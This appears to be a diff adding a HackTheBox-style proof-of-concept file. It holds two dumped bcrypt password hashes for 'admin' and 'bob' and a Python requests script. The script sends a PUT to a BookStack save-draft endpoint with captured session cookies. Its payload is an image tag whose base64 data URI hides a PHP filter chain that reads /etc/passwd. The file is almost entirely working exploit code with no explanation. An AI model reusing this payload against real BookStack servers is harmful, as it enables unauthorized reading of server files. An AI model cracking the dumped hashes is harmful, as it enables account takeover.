@@ -1,0 +1,12 @@
+admin:$2y$10$lKCae0EIUNj6f96ZnLqnC.LbWqrBQCT1LuHEFht6PmE4yH75rpWya
+bob:$2y$10$yMypIj1keU.VAqBI692f..XXn0vfyBL7C1EhOs35G59NxmtpJ/tiy
+
+
+
+import requests
+
+burp0_url = "http://checker.htb:80/ajax/page/9/save-draft"
+burp0_cookies = {"XSRF-TOKEN": "eyJpdiI6Ii9ITVdWYjNzWmJsZHMwbVdJVGJSTkE9PSIsInZhbHVlIjoiUnNhaE8vamlRa1QrTjJrWG1FS3ZUdHUzbC8yRVpoakorZjNZWmFrZjFmaDJ2UWFNRFJmN1BYRy9FMi83MmJVc0VwNmpPc2ljVW83V21EemM3WnVteE0xbDdQN2lzZnFqS3gxRWxXQ2JNUGt3alFIOUg3bmJIRnIzUk5OZWFsbk4iLCJtYWMiOiJmNjhjYzUwYmY3ODdiZDBhYzViOGNjODhiYTA1NjY4YWRjN2U4MWUxMGRlYzg4NDkwYTA5ZTQ4YTIwYjU1NGY1IiwidGFnIjoiIn0%3D", "bookstack_session": "eyJpdiI6ImhOK0FnMlAvcnRGMVJrQUl6bzhMSUE9PSIsInZhbHVlIjoiSnhpOUVSSFNtdmNWeDN3Wmt1THNENHVMczgxM3N6a3dwMk8vWDZGYWFOZ3FUYlZBRnNyU3RGV2daSlYwMW5wUlgwVDFBa3cyY2RGaVVBRUthZ1ZIT3FENEdMc3I0SXBWd1BUajdrejdjcndGeUNoK2JicEFaR1hrcW9sbmhYMEwiLCJtYWMiOiI2NGU3OGRmM2I4Yjg1Y2UwOTJiZWViY2UwZGJiZTc3MzhmYzY2YjFjNmJiZTBhNTRjODZjYjI1YjBkNDViN2ZhIiwidGFnIjoiIn0%3D", "teampass_session": "89l9ui5h8so2u36p3sueqokcdr", "558fa9b1ffa04df378a1f2bb1a4cceed1e7cc9d4adbbfe21e2": "8243c8339d0143f578bfda1498ef8a917b392890b7fdaea9fc", "jstree_select": "1", "remember_standard_59ba36addc2b2f9401580f014c7f58ea4e30989d": "eyJpdiI6InlBR2FuSk1CczFSb2lkUnhPM0NyYmc9PSIsInZhbHVlIjoibmNnUURFRDlGYUp0SWVLamlHS2FJZjdvQk4xTFVxMVpWVWkwVEMzb244THZIN3RqYjZpcXMzUjVuRUtvc0M5Z1pSMkk2QlFjWHN0c3JQL1l6dGdtK3VuK3I1TVJudHJIVGNvcm5JRXUyM0MwZkZ2ME1vcFQ5S3FKNUJmUXhTcFIyOUNoZkhoN3JmYzdQRXNzVlVEbWZCMTQzZXczanVXMjZkdmRKZW5UMGVBdW5SRkFHS2luUXhxTUR6elBObHlFTDQ3Z3JnNkpwclNBWkZJa01ERFpzQTRpMk5PUGV0NCtqdXhXdmNPMUNDaz0iLCJtYWMiOiI0ODc1MWFhMzI1M2FmMjBhMTVjNGQwNjE3MTlkODE0OTc2Njk5NDEzOGJlZDdkMGI3N2ZhZDJhNDk3NzRlZjYzIiwidGFnIjoiIn0%3D"}
+burp0_headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Accept-Encoding": "gzip, deflate, br", "Referer": "http://checker.htb/books/poc/page/poc/edit", "Content-Type": "application/json", "X-Requested-With": "XMLHttpRequest", "baseURL": "http://checker.htb/", "X-CSRF-TOKEN": "tOm6HneoWvkcGN33VYW2CAqOvvcf2GDoQME1RSVF", "Origin": "http://checker.htb", "Connection": "keep-alive", "Priority": "u=4"}
+burp0_json={"html": "<img src='data:image/png;base64,cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWVuY29kZXxjb252ZXJ0Lmljb252Ljg1NS5VVEY3fGNvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT0vZXRjL3Bhc3N3ZA'/>", "name": "poc"}
+requests.put(burp0_url, headers=burp0_headers, cookies=burp0_cookies, json=burp0_json)
